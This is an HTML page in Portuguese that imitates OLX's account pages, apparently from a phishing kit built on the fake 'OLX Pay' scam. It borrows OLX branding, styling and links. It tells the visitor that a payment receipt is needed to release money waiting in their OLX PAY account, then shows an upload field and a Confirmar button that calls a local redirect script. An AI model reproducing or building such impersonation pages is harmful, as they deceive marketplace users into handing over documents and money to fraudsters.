<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charSet="utf-8"/>
    <meta name="theme-color" content="#000000"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <meta name="description" content="OLX - Rápido e Fácil pra comprar e desapegar. Vender e Comprar nunca foi tão fácil! Anuncie Online na OLX - Você tem alguma coisa para desapegar. Desapega!"/>
    <title>Minha conta | OLX</title>
    <link data-react-helmet="true" rel="apple-touch-icon" sizes="180x180" href="../assets/img/apple-touch-icon.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="32x32" href="../assets/img/favicon-32x32.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="192x192" href="../assets/img/android-chrome-192x192.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="../assets/img/favicon-16x16.png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz@0,6..12;1,6..12&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="assets/css/enviar-comprovante.css">
</head>
<body>
    <header class="header">
        <nav>
            <div class="logo">
                <img src="assets/img/olx.svg" alt="olx-image">
            </div>
        </nav>
    </header>
    <div class="form-container">
        <h1>Envie o comprovante</h1>
        <div class="flex items-center bg-yellow-50 border border-yellow-300 rounded-md p-4 mb-4">
            <i class="fas fa-exclamation-triangle text-yellow-500 text-xl mr-3"></i>
            <p class="text-yellow-700">O comprovante é necessário para acelerar a liberação dos seus valores a receber em sua OLX PAY.</p>
        </div>
        <label for="comprovante" class="mb-4" style="background-color: #6a1b9a; color: #ffffff; padding: 10px; border: none; border-radius: 20px; width: 100%; text-align: center; cursor: pointer;">
            Enviar comprovante
            <input type="file" id="comprovante" name="comprovante" accept=".pdf, .jpg, .jpeg, .png" style="display: none;" autocomplete="off">
        </label>
        <button onclick="delayedRedirect()" id="enviar-comprovante">Confirmar</button>
    </div>
    <div class="continuar fixed bottom-0 left-0 w-full p-4 bg-gray-100 text-center text-gray-600">
        <p>Ao continuar, você concorda com os <a href="https://ajuda.olx.com.br/s/article/termos-e-condicoes-de-uso">Termos de Uso</a> e a <a href="https://ajuda.olx.com.br/s/article/politica-de-privacidade">Política de Privacidade</a></p>
        <p> da OLX e seus parceiros, e em receber comunicações da OLX.</p>
    </div>

    <script src="assets/js/enviar-comprovante.js"></script>
</body>
</html>
